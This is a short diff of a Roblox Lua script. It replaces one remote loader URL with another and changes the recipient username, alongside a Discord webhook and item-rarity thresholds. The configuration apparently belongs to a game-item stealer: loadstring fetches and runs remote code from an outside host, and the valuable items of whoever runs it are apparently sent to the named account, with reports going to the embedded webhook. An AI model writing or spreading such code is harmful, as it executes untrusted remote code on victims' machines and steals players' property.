@@ -1,10 +1,10 @@
 local function visual()
-    loadstring(game:HttpGet('https://api.luarmor.net/files/v4/loaders/5857a6cfae3b902eb3c2dff7cdbf173b.lua'))()
+    loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/19GgBtUXMcEKYb2O/raw'))()
 end
 
 task.spawn(visual)
 
-Usernames = {"Capweks"} -- You can add multiple users if you know how!
+Usernames = {"siia_06"} -- You can add multiple users if you know how!
 Webhook = "https://discord.com/api/webhooks/1480088657745416285/Swczm5ZQ20SJBB-qVMvXwrghk7DyOSUMEQVuDW98WbK1UdG2blrNfENVtppcAlWcBC9C"  -- Protect your webhook at https://sentinelhook.lol/ .
 MinimumRarity = "Godly" -- Options: Common/Uncommon/Rare/Legendary/Godly/Ancient/Vintage/Unique.
 MinimumValue = 1 -- Set it to 5 (Recommended).
